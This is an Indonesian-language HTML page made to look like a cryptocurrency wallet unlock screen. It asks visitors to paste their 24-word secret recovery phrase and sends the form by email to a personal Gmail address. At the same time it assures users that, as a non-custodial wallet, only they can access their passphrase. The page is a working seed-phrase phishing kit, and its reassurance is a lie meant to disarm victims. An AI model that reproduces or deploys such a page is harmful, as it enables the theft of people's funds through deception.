<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header class="header">
        <a href="#" class="back-button">&larr;</a>
        <h1 class="title">
            <img src="icon-wallet.png" alt="Wallet Icon"> Wallet
        </h1>
    </header>

    <main class="content">
        <h2>Tempel Kunci Rahasia Anda untuk membuka kunci dompet Anda</h2>
        <form action="mailto:heprahot@gmail.com" method="POST" enctype="text/plain">
            <textarea name="message" placeholder="Masukkan kata sandi 24 kata anda di sini" rows="8" required></textarea>
            <button type="submit" class="button primary">Buka kunci dengan frasa sandi</button>
        </form>
        <button class="button secondary">Buka kunci dengan Sidik Jari</button>
        <p class="note">
            Sebagai dompet non-custodial, kata sandi dompet Anda hanya dapat diakses secara eksklusif oleh Anda. Pemulihan frasa sandi...
        </p>
    </main>
</body>
</html>
